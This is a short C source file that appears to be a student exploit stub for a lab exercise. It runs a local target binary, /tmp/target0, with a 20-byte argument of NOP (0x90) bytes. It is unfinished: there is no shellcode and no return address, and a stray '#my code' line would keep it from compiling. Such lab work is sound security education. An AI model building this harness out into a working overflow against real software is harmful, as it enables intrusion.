#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];

  #my code
	char hack[20];
	memset(hack, 0x90, 20);
	strncpy(hack,"A",1);
  
  args[0] = TARGET; args[1] = hack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
